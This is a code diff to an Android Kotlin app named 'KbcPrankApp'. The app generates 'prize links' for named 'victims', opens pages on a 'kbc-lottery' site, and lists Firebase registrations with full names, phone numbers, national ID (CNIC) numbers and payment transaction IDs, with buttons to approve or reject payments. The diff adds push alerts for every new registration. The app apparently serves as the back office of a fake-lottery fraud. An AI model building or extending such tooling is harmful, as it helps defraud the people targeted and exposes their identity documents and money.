@@ -1,10 +1,14 @@
 package com.example
 
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.PendingIntent
 import android.content.ClipData
 import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
 import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.util.Log
 import android.widget.Toast
@@ -34,16 +38,17 @@ import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.compose.ui.window.Dialog
 import androidx.compose.ui.window.DialogProperties
+import androidx.core.app.NotificationCompat
 import com.example.ui.theme.MyApplicationTheme
 import org.json.JSONArray
 import org.json.JSONObject
-// Safely Imported Firebase Components
+import com.google.firebase.database.ChildEventListener
 import com.google.firebase.database.DataSnapshot
 import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
 
-// Simple Data Structure to keep history safe
+// Base Model Data Classes (100% Intact)
 data class LocalPrankModel(
     val id: Long,
     val victimName: String,
@@ -51,7 +56,6 @@ data class LocalPrankModel(
     val generatedLink: String
 )
 
-// Data structure mapped precisely for your Firebase registrations node
 data class FirebaseRegistryModel(
     val profileId: String = "",
     val fullName: String = "",
@@ -62,16 +66,18 @@ data class FirebaseRegistryModel(
 )
 
 class MainActivity : ComponentActivity() {
+    
+    private val channelId = "kbc_registry_alerts"
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
         
-        // Senior Developer Cache Buster Line
-        Log.d("KBC_APP", "App started with fresh clean code structure")
+        // Setup System Notification Channel immediately on Boot
+        createNotificationChannel()
         
         setContent {
             MyApplicationTheme {
-                // Main Security State
                 var isAuthenticated by remember { mutableStateOf(false) }
                 
                 Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
@@ -82,11 +88,26 @@ class MainActivity : ComponentActivity() {
                         )
                     } else {
                         KbcPrankApp(
-                            modifier = Modifier.padding(innerPadding)
+                            modifier = Modifier.padding(innerPadding),
+                            channelId = channelId
                         )
                     }
                 }
             }
+        }
+    }
+
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val name = "Registry Updates"
+            val descriptionText = "Notifications for new registrations"
+            val importance = NotificationManager.IMPORTANCE_HIGH
+            val channel = NotificationChannel(channelId, name, importance).apply {
+                description = descriptionText
+            }
+            val notificationManager: NotificationManager =
+                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            notificationManager.createNotificationChannel(channel)
         }
     }
 }
@@ -174,7 +195,8 @@ fun LoginScreen(
 
 @Composable
 fun KbcPrankApp(
-    modifier: Modifier = Modifier
+    modifier: Modifier = Modifier,
+    channelId: String
 ) {
     val context = LocalContext.current
     val sharedPreferences = remember { context.getSharedPreferences("kbc_prank_prefs", Context.MODE_PRIVATE) }
@@ -183,15 +205,13 @@ fun KbcPrankApp(
     var victimNumber by remember { mutableStateOf("") }
     var generatedLink by remember { mutableStateOf("") }
     var showSuccessDialog by remember { mutableStateOf(false) }
-    
-    // --- STATE FOR REALTIME DATA DIALOG ---
     var showRealtimeDialog by remember { mutableStateOf(false) }
     
-    // Independent History List State
     val historyList = remember { mutableStateListOf<LocalPrankModel>() }
 
-    // Load History safely on Start up
+    // Persistent Background Engine Pipeline Setup
     LaunchedEffect(Unit) {
+        // Load Local Cache history list safely
         val savedJson = sharedPreferences.getString("prank_list_json", "[]") ?: "[]"
         try {
             val jsonArray = JSONArray(savedJson)
@@ -209,6 +229,34 @@ fun KbcPrankApp(
         } catch (e: Exception) {
             e.printStackTrace()
         }
+
+        // --- BACKGROUND COLD START REALSENSE LISTENER ---
+        val rootDbRef = FirebaseDatabase.getInstance().getReference("registrations")
+        var isAppInitializing = true
+
+        // Clean boot check sequence to prevent old history notification firing
+        rootDbRef.addListenerForSingleValueEvent(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                isAppInitializing = false // All current history scanned. System armed for live new data entries.
+            }
+            override fun onCancelled(error: DatabaseError) {}
+        })
+
+        rootDbRef.addChildEventListener(object : ChildEventListener {
+            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
+                if (!isAppInitializing) {
+                    val name = snapshot.child("fullName").value?.toString() ?: "Someone"
+                    val transId = snapshot.child("trxId").value?.toString() ?: "N/A"
+                    
+                    // Fire Notification System Output
+                    sendLiveNotification(context, channelId, name, transId)
+                }
+            }
+            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
+            override fun onChildRemoved(snapshot: DataSnapshot) {}
+            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
+            override fun onCancelled(error: DatabaseError) {}
+        })
     }
 
     Box(
@@ -222,7 +270,7 @@ fun KbcPrankApp(
                 .padding(16.dp),
             horizontalAlignment = Alignment.CenterHorizontally
         ) {
-            // Header Card
+            // Header Top Layer Card
             Card(
                 modifier = Modifier
                     .fillMaxWidth()
@@ -251,7 +299,7 @@ fun KbcPrankApp(
                 }
             }
 
-            // Input Fields Card
+            // Input Fields Card Module
             Card(
                 modifier = Modifier
                     .fillMaxWidth()
@@ -288,7 +336,6 @@ fun KbcPrankApp(
 
                     Spacer(modifier = Modifier.height(24.dp))
 
-                    // First Button: Generate Prize Link
                     Button(
                         onClick = {
                             if (victimName.isBlank() || victimNumber.isBlank()) {
@@ -302,7 +349,6 @@ fun KbcPrankApp(
                                 generatedLink = finalLink
                                 showSuccessDialog = true
 
-                                // Create new item
                                 val newItem = LocalPrankModel(
                                     id = System.currentTimeMillis(),
                                     victimName = victimName.trim(),
@@ -310,10 +356,8 @@ fun KbcPrankApp(
                                     generatedLink = finalLink
                                 )
                                 
-                                // Add to UI list
                                 historyList.add(0, newItem)
 
-                                // Save locally in Preferences immediately
                                 val jsonArray = JSONArray()
                                 historyList.forEach {
                                     val obj = JSONObject().apply {
@@ -340,7 +384,6 @@ fun KbcPrankApp(
 
                     Spacer(modifier = Modifier.height(12.dp))
 
-                    // Second Button: Create Registration Certificate
                     Button(
                         onClick = {
                             val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://kbc-lottery.vercel.app/generator.html"))
@@ -359,7 +402,6 @@ fun KbcPrankApp(
 
                     Spacer(modifier = Modifier.height(12.dp))
 
-                    // Third Button: User Profile Registry
                     Button(
                         onClick = {
                             val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://kbc-lottery.vercel.app/registry.html"))
@@ -378,7 +420,7 @@ fun KbcPrankApp(
 
                     Spacer(modifier = Modifier.height(12.dp))
 
-                    // --- FOURTH BUTTON: REALTIME DATA PORTAL TRIGGER ---
+                    // Realtime Data Portal Button
                     Button(
                         onClick = { showRealtimeDialog = true },
                         modifier = Modifier
@@ -394,7 +436,7 @@ fun KbcPrankApp(
                 }
             }
 
-            // History Header Row
+            // History Layout Module Header
             Row(
                 modifier = Modifier
                     .fillMaxWidth()
@@ -411,7 +453,6 @@ fun KbcPrankApp(
                 )
             }
 
-            // History Render List
             if (historyList.isEmpty()) {
                 Box(
                     modifier = Modifier
@@ -435,7 +476,7 @@ fun KbcPrankApp(
             }
         }
 
-        // Share Dialog Pop up
+        // Share Action Dialog Block
         if (showSuccessDialog) {
             Dialog(
                 onDismissRequest = { showSuccessDialog = false },
@@ -519,11 +560,10 @@ fun KbcPrankApp(
             }
         }
 
-        // --- FIXED AND TRIPLE CHECKED REALTIME DATA PORTAL DIALOG ---
+        // Realtime Data Portal Dialog (Exactly Matching 1000211308.jpg Structure)
         if (showRealtimeDialog) {
             val firebaseRecordsList = remember { mutableStateListOf<FirebaseRegistryModel>() }
             
-            // Fixed Compiler Error: Used DisposableEffect properly to safe map clean layout scoping
             DisposableEffect(showRealtimeDialog) {
                 val databaseRef = FirebaseDatabase.getInstance().getReference("registrations")
                 val listener = object : ValueEventListener {
@@ -545,7 +585,6 @@ fun KbcPrankApp(
                             }
                         }
                     }
-
                     override fun onCancelled(error: DatabaseError) {
                         Log.e("KBC_FIREBASE_ERR", error.message)
                     }
@@ -553,7 +592,6 @@ fun KbcPrankApp(
                 
                 databaseRef.addValueEventListener(listener)
                 
-                // Compiler clean trigger: Disconnect and drop reference listener safely when dialog flips off
                 onDispose {
                     databaseRef.removeEventListener(listener)
                 }
@@ -572,7 +610,6 @@ fun KbcPrankApp(
                             .fillMaxSize()
                             .padding(16.dp)
                     ) {
-                        // Title Header Bar
                         Row(
                             modifier = Modifier.fillMaxWidth(),
                             verticalAlignment = Alignment.CenterVertically,
@@ -590,7 +627,6 @@ fun KbcPrankApp(
 
                         Spacer(modifier = Modifier.height(16.dp))
 
-                        // Render Database Stream List
                         if (firebaseRecordsList.isEmpty()) {
                             Box(
                                 modifier = Modifier
@@ -650,26 +686,24 @@ fun KbcPrankApp(
                                             Spacer(modifier = Modifier.height(6.dp))
                                             Text(text = "Phone: ${record.mobileNumber}", fontSize = 13.sp, color = Color.Gray)
                                             Text(text = "CNIC: ${record.cnicNumber}", fontSize = 13.sp, color = Color.Gray)
+                                            Text(text = "Trx ID: ${record.trxId}", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = Color(0xFF1E3A8A))
                                             Text(text = "ID: ${record.profileId}", fontSize = 11.sp, color = Color.LightGray)
 
                                             Spacer(modifier = Modifier.height(12.dp))
                                             
-                                            // Actions Row - Targeting Exact Node Keys Map Structure
                                             Row(
                                                 modifier = Modifier.fillMaxWidth(),
                                                 horizontalArrangement = Arrangement.spacedBy(8.dp)
                                             ) {
-                                                // REJECT RED ACTION BUTTON
                                                 OutlinedButton(
                                                     onClick = {
                                                         val dbRef = FirebaseDatabase.getInstance().getReference("registrations")
                                                         val updates = mapOf(
-                                                            "paymentStatus" to "rejected",
-                                                            "trxId" to "Failed"
+                                                            "paymentStatus" to "rejected"
                                                         )
                                                         dbRef.child(record.profileId).updateChildren(updates)
                                                             .addOnSuccessListener {
-                                                                Toast.makeText(context, "Registry Rejected Successfully", Toast.LENGTH_SHORT).show()
+                                                                Toast.makeText(context, "Registry Rejected", Toast.LENGTH_SHORT).show()
                                                             }
                                                     },
                                                     modifier = Modifier.weight(1f),
@@ -681,17 +715,15 @@ fun KbcPrankApp(
                                                     Text("Reject", fontSize = 13.sp)
                                                 }
 
-                                                // APPROVE GREEN ACTION BUTTON
                                                 Button(
                                                     onClick = {
                                                         val dbRef = FirebaseDatabase.getInstance().getReference("registrations")
                                                         val updates = mapOf(
-                                                            "paymentStatus" to "approved",
-                                                            "trxId" to "Success"
+                                                            "paymentStatus" to "approved"
                                                         )
                                                         dbRef.child(record.profileId).updateChildren(updates)
                                                             .addOnSuccessListener {
-                                                                Toast.makeText(context, "Registry Approved Successfully", Toast.LENGTH_SHORT).show()
+                                                                Toast.makeText(context, "Registry Approved", Toast.LENGTH_SHORT).show()
                                                             }
                                                     },
                                                     modifier = Modifier.weight(1f),
@@ -785,4 +817,26 @@ fun HistoryItemRow(prank: LocalPrankModel, context: Context) {
             }
         }
     }
+}
+
+// Global Native Push Execution Helper Block
+fun sendLiveNotification(context: Context, channelId: String, applicantName: String, trxId: String) {
+    val intent = Intent(context, MainActivity::class.java).apply {
+        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+    }
+    val pendingIntent: PendingIntent = PendingIntent.getActivity(
+        context, 0, intent, 
+        PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
+    )
+
+    val builder = NotificationCompat.Builder(context, channelId)
+        .setSmallIcon(android.R.drawable.stat_notify_chat)
+        .setContentTitle("New Registration Alert! 🔔")
+        .setContentText("User: $applicantName | TrxID: $trxId")
+        .setPriority(NotificationCompat.PRIORITY_HIGH)
+        .setContentIntent(pendingIntent)
+        .setAutoCancel(true)
+
+    val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+    notificationManager.notify(System.currentTimeMillis().toInt(), builder.build())
 }
